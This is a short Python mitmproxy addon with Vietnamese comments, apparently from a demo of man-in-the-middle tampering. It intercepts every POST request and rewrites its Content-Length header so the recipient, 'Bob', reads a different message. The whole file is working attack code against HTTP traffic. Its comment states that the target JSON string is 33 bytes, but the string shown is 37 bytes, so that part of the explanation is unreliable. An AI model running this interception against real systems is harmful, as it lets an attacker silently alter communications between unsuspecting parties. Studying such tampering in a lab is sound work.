from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Để đơn giản, chúng ta sẽ sửa đổi tất cả các request POST đi qua proxy.
    if flow.request.method != "POST":
        return

    print("[+] Intercepted POST request")

    # Độ dài của body mà chúng ta muốn Bob thấy.
    # b'{"message":"The truth is out there."}' có độ dài là 33 bytes.
    new_content_length = "33"

    # Chỉ sửa đổi header Content-Length.
    # Giữ nguyên mọi thứ khác, đặc biệt là body của request.
    if "content-length" in flow.request.headers:
        original_len = flow.request.headers["content-length"]
        print(f"[+] Original Content-Length: {original_len}")
        
        flow.request.headers["content-length"] = new_content_length
        print(f"[+] Modified Content-Length to: {new_content_length}")